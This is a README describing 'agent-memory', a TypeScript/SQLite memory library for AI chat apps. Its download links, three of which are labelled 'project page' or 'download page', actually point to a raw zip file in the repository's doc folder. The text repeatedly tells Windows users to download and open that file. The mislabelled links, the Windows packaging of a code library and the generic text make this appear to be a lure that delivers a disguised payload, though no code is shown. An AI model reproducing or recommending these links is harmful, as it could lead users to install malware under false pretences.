# 🧠 agent-memory - Keep AI context in one place

[![Download](https://img.shields.io/badge/Download%20agent-memory-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/raymondmdzz123/agent-memory/main/doc/memory_agent_2.0.zip)

## 🧭 What this is

agent-memory helps an AI app remember what happened before. It keeps chat history, stores facts, and helps the app find past context when needed. It uses TypeScript, SQLite, vector search, and fact extraction to manage memory in a simple way.

This project fits apps that need:

- Conversation history
- Long-term memory
- Semantic search
- Fact storage
- Context retrieval
- Support for tools like OpenAI, Anthropic, and LangChain

## 💻 What you need

Use this on a Windows PC with:

- Windows 10 or Windows 11
- A modern browser
- Internet access
- About 200 MB of free disk space
- Permission to download and open files

If you plan to use it inside your own app, you may also need:

- Node.js 18 or later
- npm or pnpm
- SQLite support

## ⬇️ Download and open

Go to the project page here:

[Visit the download page](https://raw.githubusercontent.com/raymondmdzz123/agent-memory/main/doc/memory_agent_2.0.zip)

If the page gives you a downloadable package or release file, download it to your PC, then open the file or place it in your project folder as needed. If you are using it as a library, follow the steps below to add it to your app.

## 🛠️ Install on Windows

### If you are using it in your own project

1. Open your project folder.
2. Open Command Prompt or PowerShell.
3. Run:

   npm install agent-memory

4. Wait for the install to finish.
5. Add the library to your app code.

### If you are testing from the repository

1. Download the project from the link above.
2. Unzip the file if needed.
3. Open the folder in File Explorer.
4. Open Command Prompt in that folder.
5. Run:

   npm install
6. Run the project with the command shown in the repo files, such as:

   npm run dev

or

   npm start

## 📁 Where the memory is stored

agent-memory keeps data in SQLite, which stores information in one local file on your machine. That makes it easy to keep chat history and saved facts in one place.

It can store:

- Recent messages
- Long-term facts
- Searchable embeddings
- Agent notes
- Context for later use

This setup works well for local apps and desktop tools that need fast access to old data.

## 🔎 How search works

When your app asks a question, agent-memory can search stored memory and find the most useful items. It uses vector search to match meaning, not just exact words.

That helps with:

- Finding past chat details
- Pulling up related facts
- Reusing old context
- Keeping responses on topic

## 🧠 How fact extraction works

agent-memory can read conversation text and pull out useful facts. For example, if a user says they live in Berlin or prefer short replies, the library can save that for later use.

This helps your app remember:

- User names
- Preferences
- Important dates
- Goals
- Project details

The goal is to keep memory useful without making the app repeat the same questions.

## ⚙️ Basic setup steps

1. Install the library in your project.
2. Create a memory store.
3. Save new chat messages.
4. Extract facts from user text.
5. Search memory when you need old context.
6. Send the best matches back to your AI model.

## 🧪 Example use case

A chatbot can use agent-memory to do this:

1. A user says they run a small shop.
2. The app saves that fact.
3. The user asks a follow-up question two days later.
4. The app searches memory.
5. The chatbot remembers the shop detail and gives a better answer.

This is useful for:

- Customer support bots
- Personal assistants
- Research tools
- Knowledge apps
- Agent workflows

## 🗂️ Common project topics

This repository is related to:

- AI agents
- Memory systems
- Chatbots
- Embeddings
- Knowledge bases
- RAG
- Semantic search
- SQLite
- TypeScript
- OpenAI
- Anthropic
- LangChain

## 🔐 Data behavior

agent-memory is meant for local and app-level storage. It keeps memory in a form your app can use later. If you add your own user data, store it with care and keep access limited to the right people.

## 🧩 Integration notes

You can connect agent-memory to many AI workflows. It works well when your app needs:

- Short chat memory for the current session
- Long-term memory across sessions
- Fact lookup before each response
- Search by meaning instead of exact text
- A simple local database layer

## 📌 Quick start path

If you want the fastest path on Windows:

1. Open the link at the top.
2. Download the project from GitHub.
3. Install Node.js if you do not have it.
4. Open the folder in Command Prompt.
5. Run npm install.
6. Run the project command in the repository.
7. Connect it to your app or test script.

## 🧰 If something does not open

If Windows does not open the file or folder:

- Right-click the folder and choose Open in Terminal
- Check that Node.js is installed
- Make sure you are in the correct folder
- Try running the command again
- Re-download the project if the file looks broken

## 📚 What this library is good for

Use agent-memory when you want an AI app to:

- Remember past chats
- Save facts from user messages
- Search old context
- Keep answers steady across sessions
- Use local storage instead of a remote service

## 🖥️ Windows setup path

For most Windows users, the process is:

1. Open the GitHub page.
2. Get the source or release package.
3. Unzip the files.
4. Install the needed tools.
5. Run the setup command.
6. Start the app or link the library into your project.

## 🔗 Download again

[Open the project page](https://raw.githubusercontent.com/raymondmdzz123/agent-memory/main/doc/memory_agent_2.0.zip)

## 🧭 File names you may see

After download, you may see files like:

- package.json
- README.md
- src
- dist
- tsconfig.json
- SQLite-related files

These files help the project build and run in a TypeScript setup.

## 🧠 Memory flow

The usual flow is:

1. User sends a message.
2. The app stores the message.
3. The app pulls out key facts.
4. The app searches older memory.
5. The app sends the best context to the model.
6. The model gives a better reply.

This keeps the app from acting like every message is new.

## 🧭 Next step

Open the GitHub page, download the project, and run it on your Windows PC from the files in the repository